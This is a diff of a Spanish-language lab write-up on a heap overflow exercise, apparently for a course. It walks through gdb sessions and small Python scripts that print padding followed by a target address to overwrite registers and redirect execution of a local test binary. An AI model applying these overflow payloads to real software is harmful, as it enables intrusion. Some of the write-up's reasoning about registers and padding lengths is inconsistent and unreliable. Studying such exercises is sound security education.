@@ -35,9 +35,11 @@ Ahora, intentamos ver el estado del Heap:
 ``` 
 ![Step2-Commands](imgs/step2_gdb_XXXX.png "GDB XXXX")
 
-XXXX -> 0x58585858 -> 0x4052a0 dirección 
+XXXX -> 0x58585858 -> 0x4052a0 dirección en memoria
 
 ![Step2-Commands](imgs/step2_gdb_disas.png "GDB disassembly")
+
+Observamos $rbp: 0x0040116c -> 0x4052f0 dirección en memoria
 
 ## Paso 3
 Tratamos de analizar el comportamiento del sistema cuando hacemos uso del exploit de la localización en memoria. Para ello creamos un simple programa en python:
@@ -62,17 +64,20 @@ print("X"*70 + "YAYBYCYDYEYFYG")
 ```
 Procedemos a dar permisos de ejecución como anteriormente hicimos y debugeamos el programa:
 ```
-gdb -q ./heapOverflow.o    #-q para que no muestre el banner de bienvenida
-(gdb) run $(./python2.py)      #Corremos el programa con el exploit
-(gdb) info registers    #Mostramos los registros
-(gdb) q                 #Salimos del debugger
-(gdb) y                 #Para confirmar la salida de gdb
+gdb -q ./heapOverflow.o     #-q para que no muestre el banner de bienvenida
+(gdb) run $(./python2.py)   #Corremos el programa con el exploit
+(gdb) info registers        #Mostramos los registros
+(gdb) q                     #Salimos del debugger
+(gdb) y                     #Para confirmar la salida de gdb
 ```
 Observamos el valor de $rip: GYFY -> 0x47594659
 
 ![Step4-Commands](imgs/step4_gdb_python2.png "GDB registers")
 
 No obstante, este enfoque acabaría por pisar la memoria, por lo que no podremos ver el registro. Por eso es mejor realizar lo siguiente:
+
+![Step4-Commands](imgs/step4_diferencia_hex.png "GDB registers")
+
 ```python
 #!/usr/bin/python
 print("X"*80 + "CDEF")
@@ -90,7 +95,7 @@ Disassembling de la función f_entrar():
 De la foto anterior, podemos observamos que el registro $rbp (base pointer) apunta a la dirección 0x00401156. Por lo tanto, podemos realizar un exploit que nos permita modificar el valor de $rbp y así poder controlar el flujo de ejecución del programa. Para ello, creamos un nuevo exploit:
 ```python
 #!/usr/bin/python
-print("X"*80 + "\x00\x40\x11\x56")
+print("X"*50 + "\x00\x40\x11\x56")
 ```
 
 Y lo ejecutamos:
